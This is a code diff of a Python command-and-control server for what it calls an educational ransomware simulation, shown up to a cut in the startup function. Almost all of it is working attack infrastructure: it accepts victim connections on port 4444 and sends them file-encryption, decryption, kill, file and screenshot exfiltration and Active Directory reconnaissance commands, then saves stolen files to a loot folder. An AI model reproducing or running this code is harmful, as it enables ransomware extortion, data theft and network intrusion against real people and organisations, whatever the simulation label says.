@@ -1,18 +1,26 @@
-import socket
-import threading
-import subprocess
-import sys
-import os
+"""Command-and-control (C2) server for the educational malware simulation."""
+
 import base64
-import time
+import binascii
+import os
+import socket
+import sys
+import threading
+from pathlib import Path
+from typing import Dict, Optional, Tuple
 
-from typing import Optional
+LOOT_DIR = Path("loot")
+LISTEN_HOST = "0.0.0.0"
+LISTEN_PORT = 4444
+SOCKET_BACKLOG = 5
+RECV_CHUNK_SIZE = 1_048_576
+MAX_INLINE_RESPONSE_BYTES = 2_000
+TRUNCATED_RESPONSE_PREVIEW_BYTES = 200
 
-LOOT_DIR = "loot"
 
-
-# ANSI Color für Terminal Output
 class Colors:
+    """ANSI color codes for terminal output formatting."""
+
     HEADER = "\033[95m"
     BLUE = "\033[94m"
     GREEN = "\033[92m"
@@ -22,710 +30,633 @@ class Colors:
     BOLD = "\033[1m"
 
 
-# Clients Connections und IDs speichern
-clients = {}
+clients: Dict[int, socket.socket] = {}
 client_id = 0
 lock = threading.Lock()
+shutdown_event = threading.Event()
+
+
+def _print_prompt() -> None:
+    print("C2>", end="", flush=True)
+
+
+def _ensure_loot_dir() -> None:
+    LOOT_DIR.mkdir(parents=True, exist_ok=True)
+
+
+def _disconnect_client(cid: int) -> None:
+    with lock:
+        clients.pop(cid, None)
+
+
+def _close_all_clients() -> None:
+    with lock:
+        open_sockets = list(clients.values())
+        clients.clear()
+
+    for client_socket in open_sockets:
+        try:
+            client_socket.close()
+        except OSError:
+            continue
+
+
+def _parse_client_id(value: str) -> Optional[int]:
+    try:
+        return int(value)
+    except ValueError:
+        print("[!] Client ID must be a number")
+        return None
+
+
+def _parse_exfil_message(data: str) -> Tuple[str, bytes]:
+    exfil_start = data.find("EXFIL_DATA:")
+    if exfil_start == -1:
+        raise ValueError("Missing EXFIL_DATA prefix")
+
+    payload = data[exfil_start:].strip()
+    parts = payload.split(":", 2)
+    if len(parts) != 3:
+        raise ValueError(f"Invalid EXFIL format: expected 3 parts, got {len(parts)}")
+
+    _, filename, b64_content = parts
+    safe_filename = os.path.basename(filename.strip())
+    if not safe_filename:
+        raise ValueError("Empty filename in EXFIL payload")
+
+    decoded_data = base64.b64decode(b64_content.strip(), validate=False)
+    return safe_filename, decoded_data
+
+
+def _save_exfil_data(data: str) -> None:
+    filename, decoded_data = _parse_exfil_message(data)
+    _ensure_loot_dir()
+
+    save_path = LOOT_DIR / filename
+    with save_path.open("wb") as loot_file:
+        loot_file.write(decoded_data)
+
+    print(
+        f"{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! "
+        f"Saved to: {save_path} ({len(decoded_data)} bytes){Colors.ENDC}"
+    )
 
 
 def parse_recon_report(data: str) -> None:
-    """
-    Parst und formatiert einen RECON_DATA Report für bessere Lesbarkeit
+    """Parse and format a `RECON_DATA` payload for readable console output."""
 
-    Extrahiert strukturierte Daten aus dem Agent-Response und gibt sie
-    farblich formatiert auf der Konsole aus.
+    marker = "RECON_DATA:AD_STRUCTURE:"
+    if marker not in data:
+        print(f"\n{Colors.HEADER}[RECON RESPONSE]{Colors.ENDC}")
+        print(data)
+        print()
+        return
 
-    Args:
-        data (str): Raw Recon-Report vom Agent
+    recon_section = data.split(marker, 1)[1]
+    recon_data = {}
+    for part in recon_section.split(";"):
+        if "=" not in part:
+            continue
+        key, value = part.split("=", 1)
+        recon_data[key] = value
 
-    Returns:
-        None: Ausgabe erfolgt direkt via print
-    """
-    try:
-        # Extract structured data
-        if "RECON_DATA:AD_STRUCTURE:" in data:
-            print(f"\n{Colors.BOLD}{Colors.HEADER}╔═══════════════════════════════════════════════════╗")
-            print(f"║    🔍 NETWORK RECONNAISSANCE REPORT              ║")
-            print(f"╚═══════════════════════════════════════════════════╝{Colors.ENDC}\n")
-            
-            # Parse key-value pairs
-            parts = data.split("RECON_DATA:AD_STRUCTURE:")[1].split(";")
-            recon_data = {}
-            for part in parts:
-                if "=" in part:
-                    key, value = part.split("=", 1)
-                    recon_data[key] = value
+    print(
+        f"\n{Colors.BOLD}{Colors.HEADER}"
+        "==============================================="
+    )
+    print("        NETWORK RECONNAISSANCE REPORT")
+    print(f"===============================================\n{Colors.ENDC}")
 
-            # Display parsed data
-            if "DOMAIN" in recon_data:
-                print(f"{Colors.BLUE}[*] Domain:{Colors.ENDC} {recon_data['DOMAIN']}")
-            
-            if "ADMINS" in recon_data:
-                admins = recon_data["ADMINS"].split(",")
-                print(f"{Colors.BLUE}[*] Domain Admins ({len(admins)}):{Colors.ENDC}")
-                for admin in admins[:10]:  # Limit to first 10
-                    print(f"    • {admin}")
-                if len(admins) > 10:
-                    print(f"    ... and {len(admins) - 10} more")
-            
-            if "COMPUTERS" in recon_data:
-                computers = recon_data["COMPUTERS"].split(",")
-                print(f"{Colors.BLUE}[*] Computers ({len(computers)}):{Colors.ENDC}")
-                for comp in computers[:10]:
-                    print(f"    • {comp}")
-                if len(computers) > 10:
-                    print(f"    ... and {len(computers) - 10} more")
-            
-            if "SHARES" in recon_data:
-                shares = recon_data["SHARES"].split(",")
-                print(f"{Colors.GREEN}[*] SMB Shares ({len(shares)}):{Colors.ENDC}")
-                for share in shares[:15]:
-                    print(f"    • {share}")
-                if len(shares) > 15:
-                    print(f"    ... and {len(shares) - 15} more")
-            
-            if "HVT" in recon_data:
-                hvts = recon_data["HVT"].split(",")
-                print(f"{Colors.WARNING}{Colors.BOLD}[!] High-Value Targets ({len(hvts)}):{Colors.ENDC}")
-                for hvt in hvts:
-                    print(f"    🎯 {hvt}")
-            
-            print(f"\n{Colors.BOLD}{'─' * 50}{Colors.ENDC}\n")
-        else:
-            # Fallback: show raw if not in expected format
-            print(f"\n{Colors.HEADER}[RECON RESPONSE]{Colors.ENDC}")
-            print(data)
-            print()
-    except Exception as e:
-        print(f"{Colors.FAIL}[!] Error parsing recon data: {e}{Colors.ENDC}")
-        print(f"[!] Raw data: {data[:500]}")
+    domain = recon_data.get("DOMAIN")
+    if domain:
+        print(f"{Colors.BLUE}[*] Domain:{Colors.ENDC} {domain}")
+
+    admins = recon_data.get("ADMINS", "")
+    if admins:
+        admin_items = [item for item in admins.split(",") if item]
+        print(f"{Colors.BLUE}[*] Domain Admins ({len(admin_items)}):{Colors.ENDC}")
+        for admin in admin_items[:10]:
+            print(f"    - {admin}")
+        if len(admin_items) > 10:
+            print(f"    ... and {len(admin_items) - 10} more")
+
+    computers = recon_data.get("COMPUTERS", "")
+    if computers:
+        computer_items = [item for item in computers.split(",") if item]
+        print(f"{Colors.BLUE}[*] Computers ({len(computer_items)}):{Colors.ENDC}")
+        for computer in computer_items[:10]:
+            print(f"    - {computer}")
+        if len(computer_items) > 10:
+            print(f"    ... and {len(computer_items) - 10} more")
+
+    shares = recon_data.get("SHARES", "")
+    if shares:
+        share_items = [item for item in shares.split(",") if item]
+        print(f"{Colors.GREEN}[*] SMB Shares ({len(share_items)}):{Colors.ENDC}")
+        for share in share_items[:15]:
+            print(f"    - {share}")
+        if len(share_items) > 15:
+            print(f"    ... and {len(share_items) - 15} more")
+
+    high_value_targets = recon_data.get("HVT", "")
+    if high_value_targets:
+        target_items = [item for item in high_value_targets.split(",") if item]
+        print(
+            f"{Colors.WARNING}{Colors.BOLD}[!] High-Value Targets "
+            f"({len(target_items)}):{Colors.ENDC}"
+        )
+        for target in target_items:
+            print(f"    - {target}")
+
+    print(f"\n{Colors.BOLD}{'-' * 47}{Colors.ENDC}\n")
 
 
 def handle_client(
-    client_socket: socket.socket, client_address: tuple[str, int], cid: int
+    client_socket: socket.socket, client_address: Tuple[str, int], cid: int
 ) -> None:
-    """
-    Verarbeitet eine aktive Client Verbindung in einem eigenen Thread
+    """Handle all incoming messages for one connected client in a dedicated thread."""
 
-    Vorgehensweise: wartet in einer Endlosschleife auf eingehende Nachrichten des Clients,
-    gibt diese auf der Server-Konsole aus und schließt die Verbindung bei einem Abbruch
-
-    Args:
-        client_socket (socket.socket): Das offene Socket-Objekt für die Kommunikation
-        client_adress (tuple[str, int]): Die Adresse des Clients, bestehend aus (IP, Port).
-        cid (int) : die vom Server vergebenene ID (zur Identifikation)
-
-    Returns:
-        None: Keine Return, läuft als Endlosschleife
-    """
-    print(
-        f"{Colors.GREEN}[+] Neue Verbindung: ID {cid} from {client_address}{Colors.ENDC}"
-    )
-    clients[cid] = client_socket
+    print(f"{Colors.GREEN}[+] New connection: ID {cid} from {client_address}{Colors.ENDC}")
+    with lock:
+        clients[cid] = client_socket
 
     exfil_buffer = ""
-    is_exfil_only_connection = False  # Flag für reine Exfil-Verbindungen
+    is_exfil_only_connection = False
+
     try:
-        while True:
-            # Clientantworten auf befehle erhalten
-            chunk = client_socket.recv(1048576).decode("utf-8", errors="ignore")
-            if not chunk:
+        while not shutdown_event.is_set():
+            try:
+                chunk_bytes = client_socket.recv(RECV_CHUNK_SIZE)
+            except OSError as error:
+                print(f"[!] Socket error with client ID {cid}: {error}")
                 break
 
-            # Wenn wir gerade EXFIL_DATA sammeln
+            if not chunk_bytes:
+                break
+
+            chunk = chunk_bytes.decode("utf-8", errors="ignore")
+
             if exfil_buffer:
                 exfil_buffer += chunk
-                # Prüfen ob wir fertig sind (keine weiteren Daten mehr)
-                if len(chunk) < 1048576:  # Letzter Chunk ist kleiner als Buffer
-                    data = exfil_buffer
-                    exfil_buffer = ""
-                else:
-                    continue  # Weiter sammeln
+                if len(chunk_bytes) == RECV_CHUNK_SIZE:
+                    continue
+                data = exfil_buffer
+                exfil_buffer = ""
             elif "EXFIL_DATA" in chunk:
-                # Start einer EXFIL-Übertragung
-                is_exfil_only_connection = True  # Markiere als reine Exfil-Verbindung
+                is_exfil_only_connection = True
                 exfil_buffer = chunk
-                if len(chunk) < 1048576:  # Alles in einem Chunk
-                    data = exfil_buffer
-                    exfil_buffer = ""
-                else:
-                    continue  # Weiter sammeln
+                if len(chunk_bytes) == RECV_CHUNK_SIZE:
+                    continue
+                data = exfil_buffer
+                exfil_buffer = ""
             else:
                 data = chunk
 
             if "RECON_DATA" in data:
                 parse_recon_report(data)
-                print("C2>", end="", flush=True)
-            elif "EXFIL_DATA" in data:
+                _print_prompt()
+                continue
+
+            if "EXFIL_DATA" in data:
                 try:
-                    # Format des Agents: "EXFIL_DATA:<filename>:<base64_string>"
-                    # Extrahiere nur den "EXFIL_DATA:..." Teil (ohne die Rest-Response)
-                    exfil_start = data.find("EXFIL_DATA:")
-                    if exfil_start != -1:
-                        exfil_data = data[exfil_start:]
-                    else:
-                        exfil_data = data
-                    
-                    parts = exfil_data.strip().split(":", 2)
-                    if len(parts) != 3:
-                        raise ValueError(f"Invalid EXFIL format: expected 3 parts, got {len(parts)}")
-                    
-                    prefix, filename, b64_content = parts
-                    filename = filename.strip()  # Leerzeichen entfernen
-
-                    if not os.path.exists(LOOT_DIR):
-                        os.makedirs(LOOT_DIR)
-
-                    safe_filename = os.path.basename(filename)
-                    save_path = os.path.join(LOOT_DIR, safe_filename)
-
-                    # Decode and write
-                    print(f"\n{Colors.WARNING}[*] Decoding {len(b64_content)} bytes of Base64 data...{Colors.ENDC}")
-                    decoded_data = base64.b64decode(b64_content)
-                    with open(save_path, "wb") as f:
-                        f.write(decoded_data)
-
                     print(
-                        f"{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! Saved to: {save_path} ({len(decoded_data)} bytes){Colors.ENDC}"
+                        f"\n{Colors.WARNING}[*] Processing exfiltrated payload...{Colors.ENDC}"
                     )
-                    print(f"C2>", end="", flush=True)
-
-                except Exception as e:
+                    _save_exfil_data(data)
+                    _print_prompt()
+                except (ValueError, binascii.Error, OSError) as error:
                     print(
-                        f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {e}{Colors.ENDC}"
+                        f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {error}"
+                        f"{Colors.ENDC}"
                     )
-                    print(f"[!] Data length: {len(data)}")
-                    # Debug: Zeige die ersten paar Zeichen, um das Format zu prüfen
-                    if len(data) > 200:
-                        print(f"[!] Data starts with: {data[:200]}")
-                    else:
-                        print(f"[!] Data: {data}")
+                    print(f"[!] Payload length: {len(data)}")
+                continue
+
+            if len(data) > MAX_INLINE_RESPONSE_BYTES:
+                preview = data[:TRUNCATED_RESPONSE_PREVIEW_BYTES]
+                print(
+                    f"\n[ID {cid}] Response (truncated):\n"
+                    f"{preview}...\n"
+                    f"[... {len(data)} bytes hidden ...]"
+                )
             else:
-                if len(data) > 2000:
-                    preview = data[:200]
-                    print(
-                        f"\n[ID {cid}] Response (TRUNCATED due to size): \n{preview}...\n[... {len(data)} bytes hidden ...]"
-                    )
-                else:
-                    print(f"\n[ID {cid}] Response: \n{data}")
+                print(f"\n[ID {cid}] Response:\n{data}")
+            _print_prompt()
 
-                print("C2>", end="", flush=True)
-
-    except Exception as e:
-        print(f"[!] Fehler mit client ID {cid}: {e}")
+        if exfil_buffer:
+            try:
+                _save_exfil_data(exfil_buffer)
+            except (ValueError, binascii.Error, OSError) as error:
+                print(f"{Colors.FAIL}[!] Could not persist exfil data: {error}{Colors.ENDC}")
 
     finally:
-        # Nur von der Client-Liste entfernen, wenn es keine reine Exfil-Verbindung war
+        _disconnect_client(cid)
+        try:
+            client_socket.close()
+        except OSError:
+            pass
+
         if not is_exfil_only_connection:
-            with lock:
-                if cid in clients:
-                    del clients[cid]
-            client_socket.close()
             print(f"[-] Client ID {cid} disconnected")
-        else:
-            # Bei reinen Exfil-Verbindungen: keine Nachricht, nur aufräumen
-            with lock:
-                if cid in clients:
-                    del clients[cid]
-            client_socket.close()
 
 
 def broadcast_command(command: str) -> None:
-    """
-    Sendet einen Befehl an alle verbundenen Clients (Broadcast)
+    """Send a command to all currently connected clients."""
 
-    Die Funktion iteriert durch alle clients und versucht,
-    den Befehl an jeden offenen Socket zu senden.
-    Sendefehler werden protokolliert und abgefangen, unterbrechen aber
-    nicht den Broadcast an die anderen Clients.
-
-    Args:
-        command (str): Befehl, der an die Clients gesendet werden soll.
-
-    Returns:
-        None
-    """
+    encoded_command = command.encode("utf-8")
     with lock:
-        for cid, client_socket in clients.items():
-            try:
-                client_socket.send(command.encode("utf-8"))
-                print(f"[+] Befehl an ID {cid} gesendet")
-            except Exception as e:
-                print(f"[!] Fehler beim senden an {cid}: {e}")
+        current_clients = list(clients.items())
+
+    for cid, client_socket in current_clients:
+        try:
+            client_socket.send(encoded_command)
+            print(f"[+] Command sent to ID {cid}")
+        except OSError as error:
+            print(f"{Colors.FAIL}[!] Failed sending to ID {cid}: {error}{Colors.ENDC}")
 
 
-def send_command_to_client(cid: int, command: str) -> None:
-    """
-    Sendet einen Befehl an einen spezifischen Client (basierend auf seiner ID)
+def send_command_to_client(cid: int, command: str) -> bool:
+    """Send a command to one client by ID and report whether it succeeded."""
 
-    Überprüft zunächst ob die ID in der Liste der aktiven Connections vorhanden ist.
-    Falls ja -> Befehl wird gesendet
-
-    Args:
-        cid (int): Die eindeutige ID des Ziel-Clients (Client-ID).
-        command (str): Der Befehl, der ausgeführt werden soll (z.B. Shell-Befehle, 'encrypt', etc.)
-
-    Returns:
-        None
-    """
     with lock:
-        if cid in clients:
-            try:
-                clients[cid].send(command.encode("utf-8"))
-                print(f"[+] Befehl an ID {cid} gesendet")
-            except Exception as e:
-                print(f"{Colors.FAIL}[!] Fehler beim senden an {cid}: {e}{Colors.ENDC}")
-        else:
-            print(f"{Colors.WARNING}[!] Client ID {cid} nicht gefunden{Colors.ENDC}")
+        client_socket = clients.get(cid)
+
+    if client_socket is None:
+        print(f"{Colors.WARNING}[!] Client ID {cid} not found{Colors.ENDC}")
+        return False
+
+    try:
+        client_socket.send(command.encode("utf-8"))
+        print(f"[+] Command sent to ID {cid}")
+        return True
+    except OSError as error:
+        print(f"{Colors.FAIL}[!] Failed sending to ID {cid}: {error}{Colors.ENDC}")
+        return False
 
 
 def kill_client(cid: int) -> None:
-    """
-    Sendet einen kill Befehl, der sämtliche Spuren der Malware auf dem Client löscht
+    """Send the `kill` command to one client to remove persistence and process state."""
 
-    Löscht wird: Executable, Persistenz, Prozess
-
-    Args:
-        cid (int): Die eindeutige ID des Ziel-Clients (Client-ID)
-
-    Returns:
-        None
-    """
-    with lock:
-        if cid in clients:
-            try:
-                clients[cid].send("kill".encode("utf-8"))
-                print(f"[+] Kill-Befehl an ID {cid} gesendet")
-            except Exception as e:
-                print(
-                    f"{Colors.FAIL}[!] Fehler beim senden des Kill-Befehl an {cid}: {e}{Colors.ENDC}"
-                )
+    if send_command_to_client(cid, "kill"):
+        print(f"[+] Kill command sent to ID {cid}")
 
 
 def encrypt_target(cid: int, target_path: str) -> None:
-    """
-    Konstruiert und sendet den Verschlüsselungsbefehl für einen bestimmten Pfad.
+    """Send an `encrypt <path>` command to the selected client."""
 
-    baut den Befehlsstring im Format `encrypt <Pfad>` zusammen und verwendet für das
-    Senden die Funktion `send_command_to_client`.
-
-    Args:
-        cid (int): Eindeutige ID des Clients, der verschlüsselt werden soll.
-        target_path (str): Der absolute oder relative Pfad auf dem Zielsyste,
-                            der rekursiv verschlüsselt werden soll.
-
-    Returns:
-        None
-    """
     encrypt_command = f"encrypt {target_path}"
-    send_command_to_client(cid, encrypt_command)
-    print(f"[+] Encrypt Befehl für Pfad '{target_path}' an ID {cid} gesendet")
+    if send_command_to_client(cid, encrypt_command):
+        print(f"[+] Encrypt command for '{target_path}' sent to ID {cid}")
 
 
 def decrypt_target(cid: int, target_path: Optional[str] = None) -> None:
-    """
-    Sendet den Befehl zur Entschlüsselung an einen spezifischen Client
+    """Send a decrypt command to a client, optionally scoped to one path."""
 
-    Wenn ein Pfad angegeben ist, wird `decrypt <path>` gesendet,
-    -> Client wird dadurch angewiesen, Dateien in diesem Pfad wiederherzustellen.
-    Ohne Pfad wird der Standard-Entschlüsselungsmodus (Root-Verzeichnis der Clients) ausgelöst.
-
-    Args:
-        cid (int): Die eindeutige ID des Clients.
-        target_path (Optional[str], optional): Spezifischer Pfad, der entschlüsselt werden soll.
-            (Default := None).
-
-    Returns:
-        None
-    """
-    if target_path:
-        cmd = f"decrypt {target_path}"
-        print(f"[+] Decrypt Command für {target_path} and ID {cid}")
-
-    else:
-        cmd = "decrypt"
-        print(f"[+] Decrypt Command (default) and ID {cid}")
-
-    send_command_to_client(cid, cmd)
+    command = f"decrypt {target_path}" if target_path else "decrypt"
+    if send_command_to_client(cid, command):
+        if target_path:
+            print(f"[+] Decrypt command for '{target_path}' sent to ID {cid}")
+        else:
+            print(f"[+] Default decrypt command sent to ID {cid}")
 
 
 def list_sessions() -> None:
-    """
-    Gibt eine Liste der aktuell verbundenen Client-Sessions aus.
+    """Print all active sessions with ID and peer IP address when available."""
 
-    Iteriert durch das `clients`-Dict (threadsicher) und zeigt die Client-Id und
-    (falls verfübar) die IP-Adresse des verbundenen Hosts an.
-
-    Args:
-        keine
-
-    Returns:
-        None: Ausgabe erfolgt direkt via `print`
-    """
     with lock:
-        if not clients:
-            print("[!] Keine aktiven Sessions")
-        else:
-            print("[*] Aktive Sessions:")
-            for cid in clients:
-                try:
-                    ip = clients[cid].getpeername()[0]
-                    print(f"\t ID {cid} - {ip}")
-                except:
-                    print(f"\t ID {cid}")
+        current_clients = list(clients.items())
 
-
-def server_shell():
-    """
-    Startet die CLI für die Interaktionen mit den Clients (kontrollierend)
-
-    Läuft in einem separaten Thread und verarbeitet Nutzereingaben
-    (bspw. `sessions`, `interact` oder `broadcast`
-    Schnittstelle zur Steuerung des C2-Server
-
-    Args:
-        keine
-
-    Returns:
-        None: Läuft in einer Endlosschleife, bis `exit` angegeben wird
-    """
-    global client_id
-
-    if not os.path.exists(LOOT_DIR):
-        os.makedirs(LOOT_DIR)
-
-    print(f"{Colors.BOLD}--- C2 COMMAND CENTER READY ---{Colors.ENDC}")
-
-    while True:
-        try:
-            cmd = input("C2> ").strip()
-        except EOFError:
-            break
-
-        if not cmd:
-            continue
-
-        if cmd == "sessions":
-            list_sessions()
-
-        elif cmd.startswith("interact "):
-            try:
-                # Versuchen die Client ID aus dem Befehl auszulesen
-                cid = int(cmd.split()[1])
-                if cid in clients:
-                    print(
-                        f"{Colors.HEADER}[*] Interacting with ID {cid}. Type 'background' to exit.{Colors.ENDC}"
-                    )
-                    while True:
-                        sub_cmd = input(f"ID {cid} @ Shell> ").strip()
-                        if sub_cmd == "background":
-                            break
-                        elif sub_cmd.startswith("encrypt "):
-                            # Encrypt Befehl in der interaktiven Session
-                            try:
-                                target_path = sub_cmd.split(" ", 1)[1]
-                                encrypt_target(cid, target_path)
-                            except IndexError:
-                                print("[!] Usage: encrypt <target_path>")
-
-                        elif sub_cmd == "decrypt":
-                            # Checken ob ein Pfad angegeben wurde
-                            parts = sub_cmd.split(" ", 1)
-                            if len(parts) == 2:
-                                # Mit Pfad
-                                decrypt_target(cid, parts[1])
-                            else:
-                                # Ohne Pfad
-                                decrypt_target(cid)
-
-                        elif sub_cmd.startswith("exfil "):
-                            send_command_to_client(cid, sub_cmd)
-                            print(
-                                f"{Colors.WARNING}[*] Waiting for data transfer...{Colors.ENDC}"
-                            )
-
-                        elif sub_cmd == "auto-exfil":
-                            send_command_to_client(cid, "auto-exfil")
-                            print(
-                                f"{Colors.WARNING}[*] Auto-Exfil gestartet auf Client {cid}. Hochwertige Dateien werden im Hintergrund exfiltriert...{Colors.ENDC}"
-                            )
-
-                        elif sub_cmd == "exfil-screenshot":
-                            send_command_to_client(cid, "exfil-screenshot")
-                            print(
-                                f"{Colors.WARNING}[*] Screenshot-Exfil gestartet auf Client {cid}...{Colors.ENDC}"
-                            )
-
-                        elif sub_cmd == "recon":
-                            send_command_to_client(cid, "recon")
-                            print(
-                                f"{Colors.HEADER}[*] Network reconnaissance gestartet auf Client {cid}...{Colors.ENDC}"
-                            )
-                            print(f"{Colors.WARNING}[*] Dies kann einige Sekunden dauern (AD/SMB Enumeration){Colors.ENDC}")
-
-                        elif sub_cmd.startswith("kill"):
-                            kill_client(cid)
-
-                        elif sub_cmd:
-                            send_command_to_client(cid, sub_cmd)
-                else:
-                    print(f"[!] Client ID {cid} nicht gefunden")
-            except (IndexError, ValueError):
-                print("[!] Usage: interact <client_id>")
-
-        elif cmd.startswith("encrypt "):
-            # Encrypt Befehl mit Client ID
-            try:
-                parts = cmd.split(" ", 2)
-                if len(parts) != 3:
-                    print("[!] Usage: encrypt <client_id> <target_path>")
-                else:
-                    cid = int(parts[1])
-                    target_path = parts[2]
-                    encrypt_target(cid, target_path)
-            except ValueError:
-                print("[!] Client ID muss eine Zahl sein")
-            except Exception as e:
-                print(f"[!] Error: {e}")
-
-        elif cmd.startswith("kill "):
-            # Kill Befehl an einen angegebenen Client
-            try:
-                parts = cmd.split(" ", 2)
-                if len(parts) != 2:
-                    print("[!] Usage: kill <client_id>")
-                else:
-                    cid = int(parts[1])
-                    kill_client(cid)
-            except ValueError:
-                print("[!] Client ID muss eine Zahl sein")
-            except Exception as e:
-                print(f"[!] Error: {e}")
-
-        elif cmd.startswith("decrypt "):
-            try:
-                # cmd kann sein: decrypt 1 oder decrypt 1 /tmp/test
-                parts = cmd.split(" ", 2)
-
-                if len(parts) == 2:
-                    # decrypt <id>
-                    cid = int(parts[1])
-                    decrypt_target(cid)
-                elif len(parts) == 3:
-                    # decrypt <id> <path>
-                    cid = int(parts[1])
-                    path = parts[2]
-                    decrypt_target(cid, path)
-                else:
-                    print("[!] Usage: decrypt <client_id> [optional_path]")
-
-            except ValueError:
-                print("[!] Client ID muss eine Zahl sein")
-
-        elif cmd.startswith("broadcast "):
-            command = cmd[10:].strip()
-            if command:
-                if command.startswith("encrypt "):
-                    # Broadcast encrypt Befehl
-                    try:
-                        target_path = command.split(" ", 1)[1]
-                        broadcast_command(f"encrypt {target_path}")
-                        print(
-                            f"[+] Encrypt Befehl für Pfad '{target_path}' an alle Clients gesendet"
-                        )
-                    except IndexError:
-                        print("[!] Usage: broadcast encrypt <target_path>")
-
-                elif command == "decrypt":
-                    broadcast_command("decrypt")
-                    print("[+] Decrypt Befehl an alle Clients gesendet")
-
-                elif command == "auto-exfil":
-                    broadcast_command("auto-exfil")
-                    print(
-                        f"{Colors.WARNING}[+] Auto-Exfil Befehl an alle Clients gesendet{Colors.ENDC}"
-                    )
-
-                elif command == "exfil-screenshot":
-                    broadcast_command("exfil-screenshot")
-                    print(
-                        f"{Colors.WARNING}[+] Screenshot-Exfil Befehl an alle Clients gesendet{Colors.ENDC}"
-                    )
-
-                elif command == "recon":
-                    broadcast_command("recon")
-                    print(
-                        f"{Colors.HEADER}[+] Network Reconnaissance Befehl an alle Clients gesendet{Colors.ENDC}"
-                    )
-
-                else:
-                    broadcast_command(command)
-            else:
-                print("[!] Usage: broadcast <command>")
-
-        elif cmd.startswith("auto-exfil "):
-            try:
-                parts = cmd.split(" ", 1)
-                if len(parts) != 2:
-                    print(f"{Colors.WARNING}[!] Usage: auto-exfil <client_id>{Colors.ENDC}")
-                else:
-                    cid = int(parts[1])
-                    send_command_to_client(cid, "auto-exfil")
-                    print(
-                        f"{Colors.WARNING}[*] Auto-Exfil gestartet auf Client {cid}. Hochwertige Dateien werden im Hintergrund exfiltriert...{Colors.ENDC}"
-                    )
-            except ValueError:
-                print("[!] Client ID muss eine Zahl sein")
-            except Exception as e:
-                print(f"[!] Error: {e}")
-
-        elif cmd.startswith("exfil-screenshot "):
-            try:
-                parts = cmd.split(" ", 1)
-                if len(parts) != 2:
-                    print(f"{Colors.WARNING}[!] Usage: exfil-screenshot <client_id>{Colors.ENDC}")
-                else:
-                    cid = int(parts[1])
-                    send_command_to_client(cid, "exfil-screenshot")
-                    print(
-                        f"{Colors.WARNING}[*] Screenshot-Exfil gestartet auf Client {cid}...{Colors.ENDC}"
-                    )
-            except ValueError:
-                print("[!] Client ID muss eine Zahl sein")
-            except Exception as e:
-                print(f"[!] Error: {e}")
-
-        elif cmd.startswith("exfil "):
-            try:
-                parts = cmd.split(" ", 2)
-                if len(parts) != 3:
-                    print(
-                        f"{Colors.WARNING}[!] Usage: exfil <client_id> <remote_filepath>{Colors.ENDC}"
-                    )
-                else:
-                    cid = int(parts[1])
-                    remote_path = parts[2]
-                    send_command_to_client(cid, f"exfil {remote_path}")
-                    print(
-                        f"{Colors.WARNING}[*] Requesting file '{remote_path}' from Victim {cid}...{Colors.ENDC}"
-                    )
-            except ValueError:
-                print("[!] Client ID muss eine Zahl sein")
-
-        elif cmd.startswith("recon "):
-            try:
-                parts = cmd.split(" ", 1)
-                if len(parts) != 2:
-                    print(f"{Colors.WARNING}[!] Usage: recon <client_id>{Colors.ENDC}")
-                else:
-                    cid = int(parts[1])
-                    send_command_to_client(cid, "recon")
-                    print(
-                        f"{Colors.HEADER}[*] Network reconnaissance gestartet auf Client {cid}...{Colors.ENDC}"
-                    )
-                    print(f"{Colors.WARNING}[*] Dies kann einige Sekunden dauern (AD/SMB Enumeration){Colors.ENDC}")
-            except ValueError:
-                print("[!] Client ID muss eine Zahl sein")
-            except Exception as e:
-                print(f"[!] Error: {e}")
-
-        elif cmd == "help":
-            print(f"{Colors.HEADER}[*] Verfügbare Befehle:{Colors.ENDC}")
-            print("  sessions                    - Zeige alle aktiven Sessions")
-            print(
-                "  interact <id>               - Interagiere mit einem Client (Shell Mode)"
-            )
-            print(
-                f"  {Colors.BOLD}recon <id>                  - Starte AD/SMB Network Reconnaissance{Colors.ENDC}"
-            )
-            print(
-                f"  {Colors.BOLD}exfil <id> <remote_path>    - Lade Datei vom Opfer herunter{Colors.ENDC}"
-            )
-            print(
-                f"  {Colors.BOLD}auto-exfil <id>             - Exfiltriere automatisch hochwertige Dateien{Colors.ENDC}"
-            )
-            print(
-                f"  {Colors.BOLD}exfil-screenshot <id>       - Screenshot vom Opfer exfiltrieren{Colors.ENDC}"
-            )
-            print(
-                "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
-            )
-            print(
-                "  decrypt <id> [path]         - Entschlüssle Dateien auf spezifischem Client"
-            )
-            print(
-                "  kill <cid>                   - Sendet einen Kill-Befehl an einen spezifischen Client"
-            )
-            print("  broadcast <cmd>             - Sende Befehl an alle Clients")
-            print("                                (Unterstützt: encrypt, decrypt, auto-exfil, exfil-screenshot, recon)")
-            print("  exit                        - Server beenden")
-
-        elif cmd == "exit":
-            print(f"{Colors.FAIL}[!] Shutting down...{Colors.ENDC}")
-            with lock:
-                for client_socket in clients.values():
-                    client_socket.close()
-            os._exit(0)
-        else:
-            print("[!] Unknown command. Type 'help'.")
-
-
-def main():
-    """
-    Einstiegspunkt des C2-Server
-
-    Initialisiert den TCP-Socket, bindet ihn an den konfigurierten Port (Default: 4444)
-    und startet den Shell-Thread.
-    Wartet anschließend in einer Endlosschleife auf Verbindungen (`server.accept`), weist
-    neuen Clients eine ID zu und startet für jeden Client einen eigenen Handler-Thread.
-
-    Args:
-        keine
-
-    Returns:
-        None: Läuft, bis der Server durch KeyboardInterrupt oder den `exit` Befehl gestoppt wird.
-    """
-    global client_id
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-    try:
-        server.bind(("0.0.0.0", 4444))
-    except OSError as e:
-        print(f"{Colors.FAIL}[!] Fehler beim Binden des Ports: {e}{Colors.ENDC}")
+    if not current_clients:
+        print("[!] No active sessions")
         return
 
-    server.listen(5)
+    print("[*] Active sessions:")
+    for cid, client_socket in current_clients:
+        try:
+            peer_ip = client_socket.getpeername()[0]
+        except OSError:
+            peer_ip = "unknown"
+        print(f"\tID {cid} - {peer_ip}")
 
-    print("[*] C2 Server started on port 4444")
-    print(f"{Colors.HEADER}========================================")
-    print("    EDU-RANSOMWARE C2 SERVER v2.0")
-    print("    SERVER STARTET ON PORT 4444")
